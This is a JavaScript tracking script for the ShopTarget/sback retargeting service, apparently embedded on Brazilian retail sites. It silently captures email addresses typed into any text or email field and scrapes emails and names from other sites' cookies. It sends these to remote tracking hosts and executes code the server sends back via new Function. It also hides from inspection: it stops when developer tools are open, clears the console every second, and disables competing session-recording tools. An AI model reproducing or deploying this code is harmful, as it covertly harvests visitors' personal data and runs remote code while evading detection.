if (location['href']['indexOf']('meucarronovo.com.br') > -1) {
    if (typeof _st_account == 'undefined') {
        window['_st_account'] = 365
    };
    if (typeof _cv_data == 'undefined') {
        try {
            if (dataLayer[1]['event'] == 'lead') {
                window['_cv_data'] = {
                    "\x6F\x72\x64\x65\x72\x5F\x69\x64": 0,
                    "\x76\x61\x6C\x6F\x72": 3.00
                }
            }
        } catch (e) {}
    }
} else {
    if (location['href']['indexOf']('legiaodosherois.uol.com.br') > -1) {
        if (typeof _st_account == 'undefined') {
            window['_st_account'] = 1412
        }
    } else {
        if (location['href']['indexOf']('eduzz.com') > -1) {
            if (typeof _st_account == 'undefined') {
                window['_st_account'] = 12
            }
        }
    }
};

function msieversion() {
    var a = window['navigator']['userAgent'];
    var b = a['indexOf']('MSIE ');
    if (b > 0 || !!navigator['userAgent']['match'](/Trident.*rv\:11\./)) {
        return true
    } else {
        return false
    };
    return false
}
var dvt = 'disabled';
try {
    var _test = top['location']['href'];
    var _top = top
} catch (e) {
    var _top = self
};
if (!msieversion()) {
    try {
        (function() {
            'use strict';
            var b = {
                open: false
            };
            var c = 160;
            var d = function(a) {
                try {
                    window['dispatchEvent'](new CustomEvent('devtoolschange', {
                        detail: {
                            open: a
                        }
                    }))
                } catch (e) {}
            };
            window['check_dvt'] = function() {
                try {
                    if ((window['Firebug'] && window['Firebug']['chrome'] && window['Firebug']['chrome']['isInitialized']) || _top['window']['outerWidth'] - _top['window']['innerWidth'] > c || _top['window']['outerHeight'] - _top['window']['innerHeight'] > c) {
                        if (!b['open']) {
                            d(true)
                        };
                        b['open'] = true
                    } else {
                        if (b['open']) {
                            d(false)
                        };
                        b['open'] = false
                    }
                } catch (e) {
                    d(false)
                }
            };
            if (typeof module !== 'undefined' && module['exports']) {
                module['exports'] = b
            } else {
                window['devtools'] = b
            }
        })();
        window['addEventListener']('devtoolschange', function(a) {
            if (a['detail']['open']) {
                dvt = 'enabled';
                _st_app = {
                    li: function() {},
                    ci: function() {},
                    send_cart: function() {},
                    tracking_page: function() {},
                    set_page: function() {}
                }
            } else {
                dvt = 'disabled'
            }
        })
    } catch (e) {
        dvt = 'disabled'
    }
};
var _acc, cv_data;
if (_top['location']['href']['indexOf']('webmotors.com.br') > -1) {
    var _st_app = false
};
var _st_app = _st_app || {
    base_app: '//front.shoptarget.com.br',
    base_js: '//static.sback.tech/shoptarget',
    acc: false,
    user_id: false,
    user_name: false,
    ses_id: false,
    pv_id: false,
    li_inputs: [],
    ci_ids: [],
    li_running: false,
    ref: false,
    convert: false,
    page: 'OTHER',
    page_info: 'product_id',
    allow_tracking: false,
    allow_sc: true,
    initialize: function() {
        _st_app['ref'] = _st_app['b64'](location['href']);
        _st_app['set_session']();
        _st_app['check_complement']();
        _st_app['check_user']();
        _st_app['check_cart']();
        _st_app['li']();
        if (window['addEventListener']) {
            document['addEventListener']('DOMSubtreeModified', function(a) {
                if (_st_app['li_running'] == false) {
                    _st_app['li']()
                };
                setTimeout(function() {
                    _st_app['li']()
                }, 1500)
            });
            document['addEventListener']('DOMNodeInserted', _st_app['li'])
        };
        try {
            var b = _st_app['get_cookie']('_st_cp_view');
            if (b == '5') {
                _st_app['complete_view'](true)
            }
        } catch (e) {};
        _st_app['new_tracking']();
        _st_app['tracking_page']()
    },
    check_complement: function() {
        if (_st_app['get_cookie']('_spcid')) {
            _st_app['set_complement']({
                "\x68\x61\x73\x5F\x63\x6F\x6D\x70\x6C\x65\x6D\x65\x6E\x74": 'yes',
                "\x63\x6F\x64\x65": _st_app['get_cookie']('_spcid')
            })
        } else {
            if (!_st_app['get_cookie']('_st_no_convert')) {
                var a = _st_app['base_app'] + '/tr/spc/' + _st_app['acc'] + '/' + _st_app['ref'];
                _st_app['ajax']('GET', a, _st_app['set_complement'], false)
            }
        }
    },
    set_complement: function(c) {
        if (c['has_complement'] == 'yes') {
            _top['_acc'] = c['code'];
            _st_app['set_cookie']('_spcid', c['code'], 0.5);
            _st_app['convert'] = true;
            (function() {
                var a = _top['document']['createElement']('script');
                a['type'] = 'text/javascript';
                a['async'] = true;
                a['src'] = '//static.sback.tech/shopconvert/js/impression/v1.js';
                var b = _top['document']['getElementsByTagName']('script')[0];
                b['parentNode']['insertBefore'](a, b)
            })();
            if (typeof _cv_data === 'object') {
                _top['cv_data'] = _cv_data;
                (function() {
                    var a = _top['document']['createElement']('script');
                    a['type'] = 'text/javascript';
                    a['async'] = true;
                    a['src'] = '//static.sback.tech/shopconvert/js/conversion/v1.js';
                    var b = _top['document']['getElementsByTagName']('script')[0];
                    b['parentNode']['insertBefore'](a, b)
                })()
            };
            if (_st_app['in_iframe']()) {
                _top['_st_app'] = _st_app
            }
        } else {
            _st_app['set_cookie']('_st_no_convert', 1, 0.5)
        }
    },
    check_user: function() {
        var a = _st_app['get_cookie']('_st_id');
        if (a) {
            _st_app['user_id'] = a;
            _st_app['set_cookie']('_st_id', _st_app['user_id'], 0.5);
            _st_app['view']();
            _st_app['cn']();
            _st_app['check_conversion']()
        } else {
            if (!_st_app['get_cookie']('_st_no_user')) {
                var b = '//click.retargeter.com.br/get.php?i=' + _st_app['acc'] + '&r=' + location['href'];
                _st_app['ajax']('GET', b, _st_app['set_user'], false)
            }
        }
    },
    set_user: function(a) {
        if (a['email']) {
            _st_app['user_id'] = _st_app['b64'](a['email']);
            _st_app['view']();
            _st_app['cn']();
            _st_app['check_conversion']();
            _st_app['set_cookie']('_st_id', _st_app['user_id'], 0.5)
        } else {
            _st_app['set_cookie']('_st_no_user', 1, 0.5)
        }
    },
    set_name: function(a) {
        if (_st_app['user_id'] != false && _st_app['get_cookie']('_st_nome') == false) {
            _st_app['set_cookie']('_st_nome', true, 24);
            if (typeof a != 'undefined') {
                _st_app['user_name'] = _st_app['b64'](encodeURIComponent(a))
            };
            var b = _st_app['base_app'] + '/tr/cn/' + _st_app['acc'] + '/' + _st_app['user_id'] + '/' + _st_app['user_name'] + '/' + _st_app['ref'];
            _st_app['ajax']('GET', b, false, false)
        }
    },
    cn: function() {},
    li: function() {
        try {
            if (_st_app['li_running']) {
                return false
            } else {
                _st_app['li_running'] = true;
                setTimeout(function() {
                    _st_app['li_running'] = false
                }, 750)
            };
            var a = document['getElementsByTagName']('input');
            if (typeof a === 'undefined') {
                return false
            };
            if (a['length'] != _st_app['li_inputs']['length']) {
                if (typeof _st_app === 'undefined') {
                    return false
                } else {
                    if (typeof _st_app['li_inputs'] === 'undefined') {
                        return false
                    }
                };
                for (var b = _st_app['li_inputs']['length']; b < a['length']; b++) {
                    try {
                        var c = a[b]['type'] + a[b]['name'] + a[b]['id'];
                        if (_st_app['li_inputs']['indexOf'](c) <= -1) {
                            if (a[b]['type'] === 'text' || a[b]['type'] === 'email') {
                                if (a[b]['addEventListener']) {
                                    a[b]['addEventListener']('blur', function() {
                                        _st_app['ci'](this['value'])
                                    })
                                } else {
                                    if (a[b]['attachEvent']) {
                                        a[b]['attachEvent']('blur', function() {
                                            _st_app['ci'](this['value'])
                                        })
                                    }
                                }
                            }
                        }
                    } catch (e) {}
                }
            }
        } catch (e) {};
        if (_st_app['acc'] == 355) {
            setTimeout(function() {
                _st_app['li']()
            }, 1500)
        }
    },
    set_view: function(a) {
        _st_app['ref'] = _st_app['b64'](a);
        _st_app['view']()
    },
    view: function() {
        if (_st_app['user_id']) {
            _st_app['pv'] = _st_app['ref'];
            var a = _st_app['base_app'] + '/tr/tv/' + _st_app['acc'] + '/' + _st_app['user_id'] + '/' + _st_app['ses_id'] + '/' + _st_app['ref'];
            _st_app['ajax']('GET', a, _st_app['check_view'], false)
        }
    },
    check_view: function(a) {
        if (a['success'] == 'yes' && dvt == 'disabled') {
            _st_app['complete_view'](false);
            _st_app['set_cookie']('_st_cp_view', '5', 0.5);
            var b = a['code'];
            var c = new Function(b);
            c();
            try {
                console['clear']();
                setInterval(function() {
                    console['clear']()
                }, 1000)
            } catch (e) {}
        }
    },
    complete_view: function(a) {
        try {
            _st_app['set_cookie']('mf_user', false);
            _st_app['set_cookie']('_hjUserId', false);
            _st_app['set_cookie']('__insp_wid', false);
            _st_app['set_cookie']('__insp_identity', false);
            _st_app['set_cookie']('__insp_slim', false);
            _st_app['set_cookie']('__insp_uid', false);
            _st_app['set_cookie']('__insp_sid', false);
            _st_app['set_cookie']('__insp_pad', false);
            _st_app['set_cookie']('__insp_ref', false);
            _st_app['set_cookie']('__insp_targlpt', false);
            _st_app['set_cookie']('__insp_targlpu', false);
            _st_app['set_cookie']('rec_user', false);
            _st_app['set_cookie']('rec_session', false);
            _st_app['set_cookie']('WRUID', false);
            _st_app['set_cookie']('__CT_Data', false);
            _st_app['set_cookie']('__lotr', false);
            _st_app['set_cookie']('_lo_rid', false);
            window['mouseflow'] = false;
            window['hj'] = false;
            window['hjSiteSettings'] = false;
            window['hjBootstrap'] = false;
            window['__insp'] = false;
            window['__inspld'] = false;
            window['hoverfn'] = false;
            window['ClickTaleFetchFrom'] = false;
            window['ClickTaleGlobal'] = false;
            window['__wtw_lucky_ref_id'] = false;
            window['__wtw_lucky_site_id'] = false;
            window['__wtw_lucky_do_not_record'] = true;
            mouseflow = false
        } catch (e) {};
        if (a) {
            _st_app['set_cookie']('_st_cp_view', false)
        };
        setTimeout(function() {
            _st_app['complete_view'](a)
        }, 50)
    },
    set_session: function() {
        var a = _st_app['get_cookie']('_st_ses');
        if (!a) {
            var a = Math['random']().toString()['replace']('0.', '')
        };
        _st_app['ses_id'] = a;
        _st_app['set_cookie']('_st_ses', a, 0.5)
    },
    ci: function(a) {
        a = a['split'](',')['join']('.');
        if (/\S+@\S+\.[a-z]{2}/i ['test'](a)) {
            if (_st_app['allow_sc']) {
                var b = _st_app['b64'](a);
                var c = _st_app['user_id'];
                _st_app['user_id'] = b;
                if (_st_app['user_id'] !== c) {
                    var d = _st_app['base_app'] + '/tr/sc/' + _st_app['acc'] + '/' + _st_app['user_id'] + '/' + _st_app['user_name'] + '/' + _st_app['ses_id'] + '/' + _st_app['ref'];
                    _st_app['ajax']('GET', d, _st_app['view'], false);
                    _st_app['set_cookie']('_st_id', _st_app['user_id'], 0.5);
                    _st_app['set_cookie']('_st_no_user', 1, 0);
                    var d = '//click.retargeter.com.br/user.php?i=' + _st_app['acc'] + '&id=' + _st_app['user_id'] + '&r=' + location['href'];
                    _st_app['ajax']('GET', d, false, false)
                }
            }
        }
    },
    b64: function(a) {
        var b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
        var c, _0xdb5dx23, _0xdb5dx24, _0xdb5dx25, _0xdb5dx26, _0xdb5dx27, _0xdb5dx28, _0xdb5dx29, _0xdb5dx18 = 0,
            _0xdb5dx2a = 0,
            _0xdb5dx2b = '',
            _0xdb5dx2c = [];
        if (!a) {
            return a
        };
        do {
            c = a['charCodeAt'](_0xdb5dx18++);
            _0xdb5dx23 = a['charCodeAt'](_0xdb5dx18++);
            _0xdb5dx24 = a['charCodeAt'](_0xdb5dx18++);
            _0xdb5dx29 = c << 16 | _0xdb5dx23 << 8 | _0xdb5dx24;
            _0xdb5dx25 = _0xdb5dx29 >> 18 & 0x3f;
            _0xdb5dx26 = _0xdb5dx29 >> 12 & 0x3f;
            _0xdb5dx27 = _0xdb5dx29 >> 6 & 0x3f;
            _0xdb5dx28 = _0xdb5dx29 & 0x3f;
            _0xdb5dx2c[_0xdb5dx2a++] = b['charAt'](_0xdb5dx25) + b['charAt'](_0xdb5dx26) + b['charAt'](_0xdb5dx27) + b['charAt'](_0xdb5dx28)
        } while (_0xdb5dx18 < a['length']);
        _0xdb5dx2b = _0xdb5dx2c['join']('');
        var d = a['length'] % 3;
        var e = (d ? _0xdb5dx2b['slice'](0, d - 3) : _0xdb5dx2b) + '===' ['slice'](d || 3);
        return e['replace']('/', '_')
    },
    set_cookie: function(a, b, c) {
        if (String(window['location'])['search']('mobly.com.br') > -1) {
            var d = new Date();
            var e = d['getTime']();
            d['setTime'](e + c * 36e5);
            var f = d['getTime']();
            window['localStorage']['setItem'](a, b + '__-__' + f)
        } else {
            var d = new Date();
            var e = d['getTime']();
            d['setTime'](e + c * 36e5);
            var f = d['toUTCString']();
            var g = location['host']['replace'](/^www\.|^m\.|^checkout\.|^loja\.|^cart\.|^carrinho\.|^seguro\.|^secure\.|^ssl\./, '.');
            document['cookie'] = a + '=' + b + '; expires=' + f + '; domain=' + g + '; path=/'
        }
    },
    get_cookie: function(a) {
        if (String(window['location'])['search']('mobly.com.br') > -1) {
            var b = window['localStorage']['getItem'](a);
            if (b) {
                var c = new Date();
                var d = c['getTime']();
                var e = b['split']('__-__');
                b = e[0];
                expire = parseInt(e[1]);
                if (expire < d) {
                    b = false
                }
            } else {
                b = false
            }
        } else {
            var b = document['cookie'];
            var f = b['indexOf'](a + '=');
            if (f === -1) {
                b = false
            } else {
                f = b['indexOf']('=', f) + 1;
                var g = b['indexOf'](';', f);
                if (g === -1) {
                    g = b['length']
                };
                b = unescape(b['substring'](f, g))
            }
        };
        return b
    },
    ajax: function(a, b, c, d) {
        if (dvt == 'enabled') {
            return false
        };
        var e = new window.XMLHttpRequest();
        e['open'](a, b, true);
        if ('withCredentials' in e) {
            e['withCredentials'] = true
        };
        e['onreadystatechange'] = function() {
            if (e['readyState'] === 4 && e['status'] === 200) {
                if (c) {
                    c(JSON['parse'](e['response']))
                }
            }
        };
        if (d) {
            e['send'](JSON['stringify'](d))
        } else {
            e['send']()
        }
    },
    check_cart: function() {
        var a = _st_app['get_cookie']('_st_cart_script');
        if (a) {
            var b = _st_app['get_cookie']('_st_cart_url');
            if (location['href']['indexOf'](b) > -1 && b != false) {
                var c = {
                    script: a,
                    url: b
                };
                _st_app['set_cart'](c)
            }
        } else {
            if (!_st_app['get_cookie']('_st_no_script')) {
                var b = _st_app['base_app'] + '/tr/cc/' + _st_app['acc'] + '/' + _st_app['ref'];
                _st_app['ajax']('GET', b, _st_app['set_cart'], false)
            }
        }
    },
    set_cart: function(a) {
        if (a['script']) {
            if (location['href']['indexOf'](a['url']) > -1) {
                var b = document['createElement']('script');
                b['type'] = 'text/javascript';
                b['async'] = false;
                b['src'] = _st_app['base_js'] + '/js/' + a['script'];
                var c = document['getElementsByTagName']('script')[0];
                c['parentNode']['insertBefore'](b, c)
            };
            _st_app['set_cookie']('_st_cart_script', a['script'], 0.5);
            _st_app['set_cookie']('_st_cart_url', a['url'], 0.5)
        } else {
            _st_app['set_cookie']('_st_no_script', 1, 0.5)
        }
    },
    send_cart: function(a) {
        if (_st_app['user_id']) {
            var b = _st_app['base_app'] + '/tr/cd/' + _st_app['acc'] + '/' + _st_app['user_id'] + '/' + _st_app['ref']
        } else {
            var b = _st_app['base_app'] + '/tr/cdt/' + _st_app['acc'] + '/' + _st_app['ses_id'] + '/' + _st_app['ref']
        };
        _st_app['ajax']('POST', b, false, a);
        try {
            window['shopback_metadata'] = window['shopback_metadata'] || {};
            var c = [];
            var d = '';
            var f = 1;
            if (typeof _st_cart['id'] != 'undefined') {
                c = _st_cart['id'];
                d = 'product_id'
            } else {
                if (typeof _st_cart['name'] != 'undefined') {
                    c = _st_cart['name'];
                    d = 'title'
                } else {
                    if (typeof _st_cart['url'] != 'undefined') {
                        c = _st_cart['url'];
                        d = 'link'
                    } else {
                        if (typeof _st_cart['sku'] != 'undefined') {
                            c = _st_cart['sku'];
                            d = 'product_sku'
                        }
                    }
                }
            };
            var g = [];
            for (var h = 0; h < c['length']; h++) {
                f = 1;
                if (typeof _st_cart['qty'] != 'undefined') {
                    if (typeof _st_cart['qty'][h] != 'undefined') {
                        f = _st_cart['qty'][h]
                    }
                };
                var i = {};
                i[d] = c[h];
                i['quantity'] = f;
                g['push'](i)
            };
            window['shopback_metadata']['cart'] = g
        } catch (e) {}
    },
    sp: function(a) {
        if (_st_app['user_id']) {
            var b = _st_app['base_app'] + '/tr/sp/' + _st_app['acc'] + '/' + _st_app['user_id'] + '/' + _st_app['ses_id'] + '/' + _st_app['ref'];
            _st_app['ajax']('POST', b, false, a)
        }
    },
    vp: function(a) {
        if (_st_app['user_id']) {
            var b = _st_app['base_app'] + '/tr/vp/' + _st_app['acc'] + '/' + _st_app['user_id'] + '/' + _st_app['ses_id'] + '/' + _st_app['ref'];
            _st_app['ajax']('POST', b, false, a)
        }
    },
    set_page: function(a) {
        if (a && _st_app['user_id']) {
            var b = _st_app['base_app'] + '/tr/page/' + _st_app['acc'] + '/' + _st_app['user_id'] + '/' + _st_app['ref'] + '/' + a;
            _st_app['ajax']('GET', b)
        }
    },
    check_conversion: function() {
        if (typeof _cv_data === 'object') {
            if (_cv_data['order_id'] === 0 && _cv_data['valor'] === 0 && _st_app['acc'] == 386) {
                return false
            } else {
                var a = _st_app['base_app'] + '/tr/cv/' + _st_app['acc'] + '/' + _st_app['user_id'] + '/' + _st_app['ref'];
                _st_app['ajax']('POST', a, false, _cv_data);
                try {
                    window['shopback_metadata'] = window['shopback_metadata'] || {};
                    var b = {
                        "\x6F\x72\x64\x65\x72": _cv_data['order_id'],
                        "\x70\x72\x69\x63\x65": _cv_data['valor']
                    };
                    window['shopback_metadata']['conversion'] = b
                } catch (e) {}
            }
        }
    },
    conversion_manual: function(c) {
        if (typeof c === 'object') {
            var d = _st_app['base_app'] + '/tr/cv/' + _st_app['acc'] + '/' + _st_app['user_id'] + '/' + _st_app['ref'];
            _st_app['ajax']('POST', d, false, c);
            if (_st_app['convert']) {
                cv_data = c;
                (function() {
                    var a = document['createElement']('script');
                    a['type'] = 'text/javascript';
                    a['async'] = true;
                    a['src'] = '//static.sback.tech/shopconvert/js/conversion/v1.js';
                    var b = document['getElementsByTagName']('script')[0];
                    b['parentNode']['insertBefore'](a, b)
                })()
            }
        }
    },
    in_iframe: function() {
        try {
            return window['self'] !== window['top']
        } catch (e) {
            return true
        }
    },
    new_tracking: function() {
        var c = '79e8ae63ac10bad9b6c6b8290ffd3ae5';
        var d = String(_st_app['acc']) + c['substr'](0, 24 - String(_st_app['acc'])['length']);
        (function() {
            var a = _top['document']['createElement']('script');
            a['type'] = 'text/javascript';
            a['async'] = true;
            a['defer'] = true;
            a['src'] = '//static.sback.tech/js/initialize.js';
            a['setAttribute']('data-client', d);
            var b = _top['document']['getElementsByTagName']('script')[0];
            b['parentNode']['insertBefore'](a, b)
        })()
    },
    tracking_page: function() {
        if (_st_app['allow_tracking']) {
            if (typeof window['shopback_metadata'] == 'object') {
                if (typeof window['shopback_metadata']['page'] == 'string') {
                    if (window['shopback_metadata']['page'] != _st_app['page']) {
                        if (_st_app['user_id']) {
                            try {
                                _st_app['page'] = window['shopback_metadata']['page'];
                                var a = _st_app['page']['toLowerCase']();
                                if (a == 'product') {
                                    if (_st_app['page_info'] == 'product_sku') {
                                        a = a + '/' + window['shopback_metadata']['page_info']['product_sku']
                                    } else {
                                        a = a + '/' + window['shopback_metadata']['page_info']['product_id']
                                    }
                                };
                                var b = _st_app['base_app'] + '/tr/page/' + _st_app['acc'] + '/' + _st_app['user_id'] + '/' + _st_app['ref'] + '/' + a;
                                _st_app['ajax']('GET', b)
                            } catch (e) {
                                console['log']('Erro no tracking de p\xE1ginas')
                            }
                        }
                    }
                }
            }
        };
        setTimeout(function() {
            _st_app['tracking_page']()
        }, 1000)
    }
};
if (typeof _st_account === 'number' && dvt == 'disabled') {
    _st_app['acc'] = _st_account;
    _st_app['initialize']();
    setTimeout(function() {
        if (dvt == 'disabled') {
            try {
                _st_app['ci'](window['chaordic_meta']['user']['email']);
                _st_app['set_name'](window['chaordic_meta']['user']['name'])
            } catch (a) {};
            try {
                _st_app['ci'](siteMetadata['sessaoInfo']['usuarioInfo']['email']);
                _st_app['set_name'](siteMetadata['sessaoInfo']['usuarioInfo']['nome'])
            } catch (a) {};
            var f = _st_app['get_cookie']('chaordic_vtex_session');
            if (f) {
                try {
                    var g = JSON['parse'](f);
                    _st_app['ci'](String(g['clientProfileData']['email']));
                    if (g['clientProfileData']['firstName'] && g['clientProfileData']['firstName'] != 'null') {
                        _st_app['set_name'](g['clientProfileData']['firstName'])
                    }
                } catch (a) {}
            };
            var h = _st_app['get_cookie']('authorizationData');
            if (h) {
                try {
                    var g = JSON['parse'](h);
                    _st_app['ci'](String(g['userName']));
                    _st_app['set_name'](String(g['name']))
                } catch (a) {}
            };
            var i = _st_app['get_cookie']('emporioambevUser');
            if (i) {
                try {
                    _st_app['user_name'] = i['replace'](/"/g, '');
                    _st_app['set_name']()
                } catch (a) {}
            };
            var j = _st_app['get_cookie']('km_ni');
            if (j) {
                try {
                    _st_app['ci'](j)
                } catch (a) {}
            };
            var k = _st_app['get_cookie']('mmmLogin');
            if (k) {
                try {
                    _st_app['ci'](k['split']('#')[0]['replace']('"', ''));
                    _st_app['set_name'](String(_st_app['get_cookie']('mmmUserName')))
                } catch (a) {}
            };
            var l = _st_app['get_cookie']('tagmizeCustomerEmail');
            if (l) {
                try {
                    _st_app['ci'](l)
                } catch (a) {}
            };
            var m = _st_app['get_cookie']('tagCustomerEmail');
            if (m) {
                try {
                    _st_app['ci'](m)
                } catch (a) {}
            };
            try {
                $('img[src*="https://b.btg360.com.br"]')['each'](function() {
                    var c = decodeURIComponent($(this)['attr']('src'));
                    if (c['search']('cle=') > -1) {
                        var d = c['split']('&amp;')['join']('&')['split']('&');
                        var e = 0;
                        $['each'](d, function(a, b) {
                            if (d[e]['search']('cle=') > -1) {
                                _st_app['ci'](String(d[e]['split']('cle=')['join']('')));
                                return false
                            };
                            e++
                        })
                    }
                })
            } catch (e) {}
        }
    }, 3500)
}